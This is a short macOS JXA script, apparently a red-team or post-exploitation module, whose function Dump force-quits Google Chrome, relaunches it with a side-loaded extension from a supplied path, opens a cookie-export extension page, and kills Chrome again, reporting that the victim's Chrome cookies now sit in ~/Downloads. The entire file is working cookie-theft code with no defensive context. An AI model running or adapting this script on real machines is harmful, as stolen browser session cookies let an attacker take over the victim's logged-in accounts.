function Dump(path) {
ObjC.import('Cocoa');
ObjC.import('Foundation');
ObjC.import('stdlib');
ObjC.import('OSAKit');
ObjC.import('OpenDirectory');
ObjC.import('sqlite3');
var currentApp = Application.currentApplication();
currentApp.includeStandardAdditions = true;
var fileMan = $.NSFileManager.defaultManager;

var output = "";

try {

output += "[+] Attempting the Chrome cookie dump...\n"

var script = `
#!/bin/bash
pkill -a -i "Google Chrome"
pkill -a -i "Google Chrome"
sleep 1
/Applications/"Google Chrome.app"/Contents/MacOS/"Google Chrome" --load-extension=pathhere "https://www.google.com" &
sleep 1
/Applications/"Google Chrome.app"/Contents/MacOS/"Google Chrome" "chrome-extension://lpmockibcakojclnfmhchibmdpmollgn/editor.html?store=0" &
sleep 4
pkill -a -i "Google Chrome"`

var cmd = script.replace(/pathhere/g, path)

currentApp.doShellScript(cmd);

output += "[+] Cookie dump done! Check the ~/Downloads folder for the cookiebro cookies file\n"

return output
} catch (error){
        return error;
}


}
